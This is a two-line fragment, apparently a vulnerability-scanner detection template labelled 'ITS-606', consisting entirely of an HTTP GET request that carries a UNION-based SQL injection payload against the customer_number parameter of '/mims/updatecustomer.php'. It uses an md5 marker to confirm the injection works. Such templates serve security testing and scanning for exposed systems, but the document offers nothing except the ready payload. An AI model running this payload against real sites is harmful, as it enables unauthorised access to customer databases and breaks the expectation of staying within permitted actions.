# Vulnerable: ITS-606
GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5({{num}}),1,2),NULL,NULL,NULL,NULL,NULL,NULL'
